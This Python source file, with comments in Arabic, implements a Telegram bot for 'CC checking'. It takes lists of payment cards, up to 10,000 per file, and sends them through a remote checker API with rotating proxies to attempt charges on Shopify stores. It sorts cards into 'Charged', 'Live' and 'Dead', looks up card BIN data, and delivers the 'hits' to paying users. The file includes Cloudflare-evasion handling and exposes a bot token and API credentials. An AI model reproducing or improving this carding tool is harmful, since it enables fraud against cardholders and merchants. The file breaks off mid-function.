from telethon import TelegramClient, events, Button
from telethon.sessions import MemorySession
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import html
import urllib.parse
from datetime import datetime
import io  

# --- الإعدادات الأساسية ---
CHECKER_API_URL = 'http://62.72.20.10:8081/'
API_ID = 30067059
API_HASH = 'c9ee8df29903caf150937299f97703e2'
BOT_TOKEN = '8145446640:AAEiIDCzyoDlaf2NICb_TRz-x1SG8jffMc8'

# تم تخفيض عدد العمال لتخفيف الضغط على خادم الفحص ومنع الـ Timeout
WORKERS = 15 
DELAY = 0.5

PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

# --- 1. متغيرات الإيموجيات المخصصة ---
E_SPARKLE = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
E_SEARCH  = '<tg-emoji emoji-id="5231012545799666522">🔍</tg-emoji>'
E_SHIELD  = '<tg-emoji emoji-id="5251203410396458957">🛡</tg-emoji>'
E_MONEY   = '<tg-emoji emoji-id="5231449120635370684">💸</tg-emoji>'
E_TIME    = '<tg-emoji emoji-id="5269531045165816230">⌛</tg-emoji>'
E_PROXY   = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
E_DOWN    = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
E_CHECK   = '<tg-emoji emoji-id="6023660820544623088">✅</tg-emoji>'
E_CROSS   = '<tg-emoji emoji-id="6037570896766438989">❌</tg-emoji>'
E_CARD    = '<tg-emoji emoji-id="5971944878815317190">💳</tg-emoji>'
E_GLOBE   = '<tg-emoji emoji-id="6026367225466720832">🌐</tg-emoji>'
E_RECYCLE = '<tg-emoji emoji-id="5971837723676249096">🔄</tg-emoji>'
E_CLIP    = '<tg-emoji emoji-id="5974235702701853774">📋</tg-emoji>'
E_WARN    = '<tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji>'

# --- 2. روابط الـ GIF للأنمي ---
ANIME_GIFS = [
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif"
]

# --- 3. قائمة رموز دول العالم ---
CUSTOM_FLAG_IDS = {
    "AF":"", "AX":"", "AL":"", "DZ":"", "AS":"", "AD":"", "AO":"", "AI":"", "AQ":"", "AG":"", 
    "AR":"", "AM":"", "AW":"", "AU":"", "AT":"", "AZ":"", "BS":"", "BH":"", "BD":"", "BB":"", 
    "BY":"", "BE":"", "BZ":"", "BJ":"", "BM":"", "BT":"", "BO":"", "BQ":"", "BA":"", "BW":"", 
    "BV":"", "BR":"", "IO":"", "BN":"", "BG":"", "BF":"", "BI":"", "CV":"", "CM":"", "CA":"", 
    "KY":"", "CF":"", "TD":"", "CL":"", "CN":"", "CX":"", "CC":"", "CO":"", "KM":"", "CG":"", 
    "CD":"", "CK":"", "CR":"", "CI":"", "HR":"", "CU":"", "CW":"", "CY":"", "CZ":"", "DK":"", 
    "DJ":"", "DM":"", "DO":"", "EC":"", "EG":"", "SV":"", "GQ":"", "ER":"", "EE":"", "ET":"", 
    "FK":"", "FO":"", "FJ":"", "FI":"", "FR":"", "GF":"", "PF":"", "TF":"", "GA":"", "GM":"", 
    "GE":"", "DE":"", "GH":"", "GI":"", "GR":"", "GL":"", "GD":"", "GT":"", "GP":"", "GU":"", 
    "GW":"", "GN":"", "GY":"", "HT":"", "HM":"", "VA":"", "HN":"", "HK":"", "HU":"", "IS":"", 
    "IN":"", "ID":"", "IR":"", "IQ":"", "IE":"", "IM":"", "IL":"", "IT":"", "JM":"", "JP":"", 
    "JO":"", "KZ":"", "KE":"", "KW":"", "KG":"", "KI":"", "KP":"", "KR":"", "LA":"", "LV":"", 
    "LB":"", "LS":"", "LR":"", "LY":"", "LI":"", "LT":"", "LU":"", "MO":"", "MK":"", "MG":"", 
    "MW":"", "MY":"", "MV":"", "ML":"", "MT":"", "MH":"", "MR":"", "MQ":"", "MU":"", "YT":"", 
    "MX":"", "FM":"", "MC":"", "MD":"", "MN":"", "MS":"", "MA":"", "MZ":"", "MM":"", "NA":"", 
    "NR":"", "NP":"", "NI":"", "NL":"", "AN":"", "NC":"", "NZ":"", "NE":"", "NG":"", "NU":"", 
    "NF":"", "MP":"", "NO":"", "OM":"", "PK":"", "PW":"", "PA":"", "PS":"", "PG":"", "PN":"", 
    "PY":"", "PE":"", "QA":"", "RE":"", "RO":"", "RU":"", "RW":"", "WS":"", "SM":"", "ST":"", 
    "SA":"", "SN":"", "RS":"", "SC":"", "SL":"", "SG":"", "SX":"", "SK":"", "SI":"", "SB":"", 
    "SO":"", "ZA":"", "GS":"", "ES":"", "LK":"", "SD":"", "SR":"", "SJ":"", "SZ":"", "SE":"", 
    "CH":"", "SY":"", "TW":"", "TJ":"", "TZ":"", "TH":"", "TG":"", "TK":"", "TO":"", "TT":"", 
    "TN":"", "TR":"", "TM":"", "UG":"", "UA":"", "AE":"", "GB":"", "US":"", "UY":"", "UZ":"", 
    "VU":"", "VE":"", "VN":"", "VG":"", "WF":"", "EH":"", "YE":"", "ZM":"", "ZW":""
}

bot = TelegramClient(MemorySession(), API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'proxy error', 'proxy connection', 'bad proxy',
    'connection timeout failed', 'connection timeout', 'proxy timeout',
    'session_error', 'session error', 'session_expired', 'session expired'
)

# =========================================================================
# الجلسة الموحدة ومنظم المرور (The New Engine)
# =========================================================================
_global_session = None
# تم تخفيض منظم المرور لتجنب إغراق السيرفر بالطلبات
api_semaphore = asyncio.Semaphore(10) 

async def get_session():
    global _global_session
    if _global_session is None or _global_session.closed:
        connector = aiohttp.TCPConnector(
            limit=50,          # تم التخفيض لتجنب إغراق السيرفر
            limit_per_host=15, 
            ssl=False, 
            enable_cleanup_closed=True
        ) 
        _global_session = aiohttp.ClientSession(connector=connector)
    return _global_session
# =========================================================================

def get_file_lines(filepath):
    if not os.path.exists(filepath): return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception: return []

def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def load_sites(): return get_file_lines(SITES_FILE)
def load_proxies(): return get_file_lines(PROXY_FILE)
def is_premium(user_id): return str(user_id) in load_premium_users()

def extract_cc(text):
    pattern = r'(\d{15,16})[\|\:\/\s]+(\d{2})[\|\:\/\s]+(\d{2,4})[\|\:\/\s]+(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2: year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg: return True
    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=15, connect=5)
        session = await get_session()
        async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=timeout) as res:
            if res.status != 200:
                return 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', ''
            response_text = await res.text()
            try:
                data = json.loads(response_text)
                return (
                    str(data.get('brand', 'Unknown')), 
                    str(data.get('type', 'Unknown')), 
                    str(data.get('level', 'Unknown')), 
                    str(data.get('bank', 'Unknown')), 
                    str(data.get('country_name', 'Unknown')), 
                    str(data.get('country', 'Unknown')), 
                    str(data.get('country_flag', ''))
                )
            except json.JSONDecodeError:
                return 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', ''
    except Exception:
        return 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', ''

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'proxy': proxy}

        params = {'cc': card, 'url': site, 'proxy': proxy}
        
        # تمت زيادة وقت الـ Timeout للسماح للسيرفر بالرد براحته
        timeout = aiohttp.ClientTimeout(total=45, connect=10, sock_read=30)
        
        session = await get_session() 
        
        async with api_semaphore:
            async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
                if resp.status in [502, 503, 504, 429]:
                     return {'status': 'Site Error', 'message': f'API Congested ({resp.status})', 'card': card, 'retry': True, 'proxy': proxy}
                
                # حماية ضد انهيار الـ JSON في حال كان الرد خطأ Cloudflare
                try:
                    raw = await resp.json(content_type=None)
                except Exception:
                    return {'status': 'Site Error', 'message': 'Invalid API Response', 'card': card, 'retry': True, 'proxy': proxy}

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'shopiii')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}

        response_lower = str(response_msg).lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
        else:
            if any(k in response_lower for k in ['proxy', 'timeout', 'error', 'session', 'failed']):
                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'proxy': proxy}
    except aiohttp.ClientConnectorError:
        return {'status': 'Site Error', 'message': 'Proxy Connection Dropped', 'card': card, 'retry': True, 'proxy': proxy}
    except Exception:
        return {'status': 'Site Error', 'message': 'API Error', 'card': card, 'retry': True, 'proxy': proxy}

async def check_card_with_retry(card, sites, proxies, max_retries=5):
    last_result = None
    if not sites: return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'proxy': 'Unknown'}
    if not proxies: return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'proxy': 'Unknown'}

    available_proxies = list(proxies)

    for attempt in range(max_retries):
        if not available_proxies: 
            return {'status': 'Dead', 'message': 'All proxies failed', 'card': card, 'gateway': 'Unknown', 'price': '-', 'proxy': 'None'}
            
        site = random.choice(sites)
        proxy = random.choice(available_proxies)
        
        result = await check_card(card, site, proxy)
        if not result.get('retry'): return result

        last_result = result
        msg_lower = str(result.get('message', '')).lower()

        if 'proxy connection dropped' in msg_lower or 'bad proxy' in msg_lower:
            if proxy in available_proxies: 
                available_proxies.remove(proxy)

        if attempt < max_retries - 1:
            if 'congested' in msg_lower or 'timeout' in msg_lower:
                await asyncio.sleep(random.uniform(3.0, 6.0)) 
            else:
                await asyncio.sleep(DELAY) 

    if last_result:
        return {'status': 'Dead', 'message': f'API Failed: {str(last_result["message"])[:30]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple', 'proxy': last_result.get('proxy', 'Unknown')}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'proxy': 'Unknown'}

async def send_realtime_hit(user_id, result, hit_type):
    brand, bin_type, level, bank, country, code, default_flag = await get_bin_info(result['card'].split('|')[0])
    
    bin_type = html.escape(str(bin_type))
    level = html.escape(str(level))
    bank = html.escape(str(bank))
    code_upper = html.escape(str(code)).upper()
    
    flag_id = CUSTOM_FLAG_IDS.get(code_upper, "")
    if flag_id:  
        custom_flag = f'<tg-emoji emoji-id="{flag_id}">{default_flag if default_flag else "🏳️"}</tg-emoji>'
    else:  
        custom_flag = default_flag if default_flag else "🏳️"

    if hit_type == "Charged":
        title = f"{E_SPARKLE} Charged Card from Bot (Shopify)"
    else:
        title = f"{E_SPARKLE} Live Card from Bot (Shopify)"
    
    msg_status = html.escape(str(result.get('message', 'Approved')).upper())
    
    raw_price = result.get('price', '0.00')
    if not raw_price or raw_price == '-': price = "$0.00"
    elif not str(raw_price).startswith('$'): price = f"${raw_price}"
    else: price = str(raw_price)
        
    proxy = html.escape(str(result.get('proxy', 'Unknown Proxy')))

    message = f"""<b>{title}</b>
━━━━━━━━━━━━━━━
{E_CARD} Card  ›  <code>{result['card']}</code>
Status  ›  {msg_status} - {price} {E_MONEY}
━━━━━━━━━━━━━━━
Bin  ›  {bin_type} — {level}
Bank  ›  {bank}  {code_upper} {custom_flag}
Proxy  ›  <code>{proxy}</code> {E_PROXY}"""

    random_gif_url = random.choice(ANIME_GIFS)

    gif_file_obj = None
    try:
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        session = await get_session() 
        async with session.get(random_gif_url, timeout=timeout) as resp:
            if resp.status == 200:
                gif_bytes = await resp.read()
                gif_file_obj = io.BytesIO(gif_bytes)
                gif_file_obj.name = "hit.gif" 
    except Exception:
        pass 

    try:
        if gif_file_obj:
            await bot.send_file(user_id, file=gif_file_obj, caption=message, parse_mode='html')
        else:
            await bot.send_message(user_id, message, parse_mode='html')
    except Exception:
        try: await bot.send_message(user_id, message, parse_mode='html')
        except: pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    safe_gateway = html.escape(str(gateway))

    progress_text = f"""<b>{E_SPARKLE} ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  {E_SPARKLE}</b>
━━━━━━━━━━━━━━━━━
<b>{E_SPARKLE} 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 {E_SPARKLE}</b>

{E_CARD} Total: {results['total']} | {E_CHECK} Charged: {len(results['charged'])} | {E_SPARKLE} Live: {len(results['approved'])} | {E_CROSS} Dead: {len(results['dead'])}

{E_GLOBE} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {E_SPARKLE} {safe_gateway}

{E_TIME} Time: {hours}h {minutes}m {seconds}s
━━━━━━━━━━━━━━━━━"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try: await bot.edit_message(user_id, message_id, progress_text, buttons=buttons, parse_mode='html')
    except Exception: pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]: hits_text += f"{E_CHECK} <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]: hits_text += f"{E_SPARKLE} <code>{r['card']}</code>\n"

    if not hits_text: hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    safe_gateway = html.escape(str(gateway))

    summary = f"""<b>{E_SPARKLE} ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  {E_SPARKLE}</b>
━━━━━━━━━━━━━━━━━
<b>{E_SPARKLE} 𝐑𝐞𝐬𝐮𝐥𝐭𝐬 {E_SPARKLE}</b>

{E_CARD} Total: {results['total']} | {E_CHECK} Charged: {len(results['charged'])} | {E_SPARKLE} Live: {len(results['approved'])} | {E_CROSS} Dead: {len(results['dead'])}

{E_GLOBE} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {E_SPARKLE} {safe_gateway}

{E_TIME} Time: {hours}h {minutes}m {seconds}s
━━━━━━━━━━━━━━━━━
<b>{E_SPARKLE} 𝐇𝐢𝐭𝐬 {E_SPARKLE}</b>

{hits_text}
━━━━━━━━━━━━━━━━━

🤖 <b>Bot By: <a href="https://t.me/vryrd">vryrd</a></b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(filename, 'w') as f:
            await f.write("=" * 70 + "\n✨ CC CHECKER RESULTS ✨\nFormat: CC | Gateway | Price | Message | Site\n" + "=" * 70 + "\n\n")
            await f.write(f"✅ CHARGED ({len(results['charged'])}):\n" + "-" * 70 + "\n")
            for r in results['charged']: await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {str(r['message'])[:100]} | {r.get('site', 'Unknown')}\n")
            await f.write(f"\n✨ APPROVED ({len(results['approved'])}):\n" + "-" * 70 + "\n")
            for r in results['approved']: await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {str(r['message'])[:100]} | {r.get('site', 'Unknown')}\n")
            await f.write(f"\n❌ DEAD ({len(results['dead'])}):\n" + "-" * 70 + "\n")
            for r in results['dead']: await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {str(r['message'])[:100]} | {r.get('site', 'Unknown')}\n")

        await bot.send_message(user_id, summary, file=filename, parse_mode='html')
    except Exception: pass
    finally:
        try:
            if os.path.exists(filename): os.remove(filename)
        except: pass

async def test_site(site, proxy):
    try:
        params = {'cc': "5154623245618097|03|2032|156", 'url': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=20)
        session = await get_session()
        async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
            raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg): return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except Exception: return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    proxy_url = proxy.strip()
    if "://" not in proxy_url:
        parts = proxy_url.split(':')
        if len(parts) == 4: proxy_url = f"http://{urllib.parse.quote(parts[2])}:{urllib.parse.quote(parts[3])}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: proxy_url = f"http://{parts[0]}:{parts[1]}"
        else: proxy_url = f"http://{proxy_url}"
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        session = await get_session() 
        async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=timeout) as resp:
            if resp.status == 200: return {'proxy': proxy, 'status': 'alive'}
            else: return {'proxy': proxy, 'status': 'dead'}
    except Exception: return {'proxy': proxy, 'status': 'dead'}

# ==================== الأوامر (Commands) ====================

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    start_message = f"""<b>{E_SPARKLE} Welcome to Shopiiiii ! {E_SPARKLE}</b>
━━━━━━━━━━━━━━━━━
<b>{E_SPARKLE} 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 {E_SPARKLE}</b>

• /cc card|mm|yy|cvv - Check single CC
• /chk - Reply to .txt file to check cards

<b>{E_SPARKLE} 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 {E_SPARKLE}</b>

• /site - Check all sites & remove dead
• /rm url - Remove a specific site

<b>{E_SPARKLE} 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 {E_SPARKLE}</b>

• /proxy - Check all proxies & remove dead
• /addproxy - Add proxies (one per line)
• /chkproxy proxy - Check single proxy
• /rmproxy proxy - Remove single proxy
• /rmproxyindex 1,2,3 - Remove by index
• /clearproxy - Remove all proxies
• /getproxy - Get all proxies

━━━━━━━━━━━━━━━━━
<b>{E_WARN} Only premium users can use this bot.</b>"""
    await event.reply(start_message, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/cc(\s+.*)?$'))
async def single_cc_check(event):
    user_id = event.sender_id
    if not is_premium(user_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>\n\nOnly premium users can use this bot.", parse_mode='html')

    parts = event.message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        return await event.reply(f"{E_CROSS} <b>Invalid CC format.</b> Use: <code>/cc card|mm|yy|cvv</code>", parse_mode='html')

    sites = load_sites()
    proxies = load_proxies()

    if not sites: return await event.reply(f"{E_CROSS} <b>No sites available. Please contact admin.</b>", parse_mode='html')
    if not proxies: return await event.reply(f"{E_CROSS} <b>No proxies available. Please add proxies.</b>", parse_mode='html')

    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)

    if not cards: return await event.reply(f"{E_CROSS} <b>Invalid CC format.</b> Use: <code>/cc card|mm|yy|cvv</code>", parse_mode='html')
    card = cards[0]
    
    status_msg = await event.reply(f"<b>{E_SPARKLE} ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  {E_SPARKLE}</b>\n━━━━━━━━━━━━━━━━━\n<b>{E_SEARCH} 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠... {E_SEARCH}</b>\n\n{E_CARD} Card: <code>{card}</code>\n\n━━━━━━━━━━━━━━━━━", parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=5)
        hit_type = 'Declined'
        if result['status'] in ['Charged', 'Approved']: hit_type = result['status']
            
        await send_realtime_hit(user_id, result, hit_type)
        await status_msg.delete()
    except Exception as e: await status_msg.edit(f"{E_CROSS} <b>Error checking card:</b> {html.escape(str(e))}", parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    if not is_premium(user_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>\n\nOnly premium users can use this bot.", parse_mode='html')
    if not event.reply_to_msg_id: return await event.reply(f"{E_CROSS} <b>Please reply to a .txt file containing cards......</b>", parse_mode='html')

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'): return await event.reply(f"{E_CROSS} <b>Please reply to a .txt file.</b>", parse_mode='html')

    loaded_sites = load_sites()
    loaded_proxies = load_proxies()

    if not loaded_sites: return await event.reply(f"{E_CROSS} <b>No sites available. Please contact admin.</b>", parse_mode='html')
    if not loaded_proxies: return await event.reply(f"{E_CROSS} <b>No proxies available. Please add proxies to proxy.txt.</b>", parse_mode='html')

    status_msg = await event.reply(f"{E_SEARCH} <b>Processing your file...</b>", parse_mode='html')
    file_path = await reply_msg.download_media()

    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
    except Exception: content = ""

    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(f"{E_CROSS} <b>No valid cards found in file.</b>", parse_mode='html')
        try:
            if os.path.exists(file_path): os.remove(file_path)
        except Exception: pass
        return

    if len(cards) > 10000:
        await status_msg.edit(f"{E_SEARCH} <b>File contains more than 10000 cards. Limiting to first 10000 cards.</b>", parse_mode='html')
        cards = cards[:10000]

    try:
        if os.path.exists(file_path): os.remove(file_path)
    except Exception: pass

    total_cards = len(cards)
    await status_msg.edit(f"{E_SPARKLE} <b>Starting check for {total_cards} cards...</b>", parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {'charged': [], 'approved': [], 'dead': [], 'total': total_cards, 'checked': 0, 'start_time': time.time()}
    queue = asyncio.Queue()
    for card in cards: queue.put_nowait(card)
    
    last_update_time = [time.time()]

    async def worker():
        while not queue.empty() and session_key in active_sessions:
            session_state = active_sessions.get(session_key)
            if not session_state: break
            while session_state.get('paused', False):
                await asyncio.sleep(1)
                session_state = active_sessions.get(session_key)
                if not session_state: return

            try: card = queue.get_nowait()
            except asyncio.QueueEmpty: break
            
            try:
                res = await check_card_with_retry(card, loaded_sites, loaded_proxies, max_retries=5)
                all_results['checked'] += 1
                
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged')
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved')
                else:
                    all_results['dead'].append(res)
            except Exception as e:
                all_results['checked'] += 1
                all_results['dead'].append({'status': 'Dead', 'message': f'Worker Error: {str(e)}', 'card': card, 'gateway': 'Unknown', 'price': '-'})
            finally:
                queue.task_done()
            
            now = time.time()
            # تعديل وقت التحديث إلى 4.5 ثوانٍ لحل مشكلة توقف واجهة البوت وتجنب حظر تيليجرام (FloodWait)
            if now - last_update_time[0] >= 4.5:
                last_update_time[0] = now
                if session_key in active_sessions:
                    try: await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                    except Exception: pass

    workers = [asyncio.create_task(worker()) for _ in range(WORKERS)]
    
    while workers:
        if session_key not in active_sessions:
            for w in workers:
                if not w.done(): w.cancel()
            break
        done, pending = await asyncio.wait(workers, timeout=1.0)
        workers = list(pending)
    
    is_stopped_manually = session_key not in active_sessions

    if not is_stopped_manually:
        if session_key in active_sessions:
            try: await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
            except Exception: pass
            del active_sessions[session_key]
        try: await status_msg.delete()
        except Exception: pass

    await send_final_results(user_id, all_results)

@bot.on(events.NewMessage(pattern=r'^/chkproxy(\s+.*)?$'))
async def check_single_proxy(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    parts = event.message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip(): return await event.reply(f"{E_CROSS} <b>Usage:</b> <code>/chkproxy ip:port:user:pass</code>", parse_mode='html')
    proxy = parts[1].strip()
    safe_proxy = html.escape(proxy)
    status_msg = await event.reply(f"{E_RECYCLE} <b>Checking proxy:</b> <code>{safe_proxy}</code>...", parse_mode='html')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive': await status_msg.edit(f"{E_CHECK} <b>Proxy is ALIVE!</b>\n\n<code>{safe_proxy}</code>", parse_mode='html')
        else: await status_msg.edit(f"{E_CROSS} <b>Proxy is DEAD!</b>\n\n<code>{safe_proxy}</code>", parse_mode='html')
    except Exception as e: await status_msg.edit(f"{E_CROSS} <b>Error checking proxy:</b> {html.escape(str(e))}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy(\s+.*)?$'))
async def remove_single_proxy(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    parts = event.message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip(): return await event.reply(f"{E_CROSS} <b>Usage:</b> <code>/rmproxy ip:port:user:pass</code>", parse_mode='html')
    proxy_to_remove = parts[1].strip()
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies: return await event.reply(f"{E_CROSS} <b>Proxy not found.</b>", parse_mode='html')
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies: await f.write(f"{proxy}\n")
    await event.reply(f"{E_CHECK} <b>Proxy Removed!</b>\n\n<code>{html.escape(proxy_to_remove)}</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex(\s+.*)?$'))
async def remove_proxy_by_index(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    parts = event.message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip(): return await event.reply(f"{E_CROSS} <b>Usage:</b> <code>/rmproxyindex 1,2,3</code>", parse_mode='html')
    indices_str = parts[1].strip()
    try: indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError: return await event.reply(f"{E_CROSS} <b>Invalid indices.</b> Use numbers separated by commas.", parse_mode='html')
    current_proxies = load_proxies()
    if not current_proxies: return await event.reply(f"{E_CROSS} <b>No proxies in proxy.txt</b>", parse_mode='html')
    removed = []
    new_proxies = []
